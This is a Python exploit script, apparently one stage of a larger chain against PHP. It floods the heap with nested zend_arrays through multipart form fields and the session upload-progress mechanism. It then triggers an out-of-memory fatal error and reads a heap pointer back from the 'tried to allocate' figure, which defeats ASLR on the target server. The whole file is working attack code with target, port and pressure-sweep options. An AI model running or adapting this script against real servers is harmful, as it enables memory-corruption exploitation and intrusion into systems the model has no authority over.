#!/usr/bin/env python3
"""Steer the slot's occupant: flood bin-7 with zend_arrays (56B) whose +0x10
field is arData (a heap pointer). If an array lands at the session-id slot,
the disclosure read takes arData as its length and the fatal reports
3*arData+1 -> a canonical pointer (ASLR leak).

Consumer B = preamble + N nested-array fields (xNNNNN[a][a]...[a]x12, each
field creating one zend_array + arData per nesting level) + a pressure part
sized to reach the read-OOM band.

Modes: --host/--port/--path target; --bisect to search the pressure.
"""
import argparse
import json
import socket
import ssl
import sys
import time

sys.path.insert(0, "/root/bridge/stock")
sys.path.insert(0, "/root/chainetool")
import bridge_single_conn as sc

PREAMBLE = 1_048_437
BND = b"Z" * 12


def pre(body):
    return b"z" * (PREAMBLE - 2) + b"\r\n" + body


def build_b(arrays: int, pressure: int) -> bytes:
    out = bytearray()
    def part(name: bytes, val: bytes):
        out.extend(b"--" + BND + b'\r\nContent-Disposition: form-data; name="' + name + b'"\r\n\r\n' + val + b"\r\n")
    part(b"PHPSESSID", b"a" * 32)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(arrays):
        nm = ("x%05d" % i).encode() + b"[a]" * 12
        part(nm, b"v" * 48)
    part(b"big", b":\n" * pressure)
    out.extend(b"--" + BND + b"--\r\n")
    return pre(bytes(out))


def send(host, port, tls, path, host_header, body, timeout=180, bnd=BND):
    s = sc.open_sock(host, port, tls, timeout)
    try:
        s.sendall(sc.post_head(path, host_header, bnd, len(body), keepalive=False) + body)
        raw = b""
        while True:
            c = s.recv(65536)
            if not c:
                break
            raw += c
        return sc.status_of(raw), raw
    finally:
        try:
            s.close()
        except Exception:
            pass


def probe(host, port, tls, path, hh, arrays, pressure):
    A = pre(sc.arm_body())
    B = build_b(arrays, pressure)
    st1, r1 = send(host, port, tls, path, hh, A, bnd=sc.ARM_BOUNDARY)
    st2, r2 = send(host, port, tls, path, hh, B)
    hdr, _, body = r2.partition(b"\r\n\r\n")
    ck = sc.cookie_of(hdr)
    txt = r2.decode("latin1", "replace")
    m = __import__("re").search(r"tried to allocate (\d+) bytes", txt)
    tried = int(m.group(1)) if m else None
    tag = ""
    if tried and tried != 4096:
        ln = (tried - 1) // 3 if (tried - 1) % 3 == 0 else tried // 3
        tag = "len=0x%x %s" % (ln, "*** CANONICAL ***" if 0x7f0000000000 <= ln < 0x8000000000000 else "")
    return {"arm_oom": b"Allowed memory size" in r1, "b_status": st2,
            "cookie": len(ck), "tried": tried, "tag": tag, "b_bytes": len(B)}


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=19293)
    ap.add_argument("--tls", action="store_true")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--arrays", type=int, default=900)
    ap.add_argument("--pressure", type=int, action="append")
    args = ap.parse_args()
    hh = args.host + (":%d" % args.port if args.port not in (443,) else "")
    for p in args.pressure or [400_000, 420_000, 440_000, 460_000, 480_000]:
        r = probe(args.host, args.port, args.tls, args.path, hh, args.arrays, p)
        print("arrays=%d pressure=%d -> %s" % (args.arrays, p, r), flush=True)
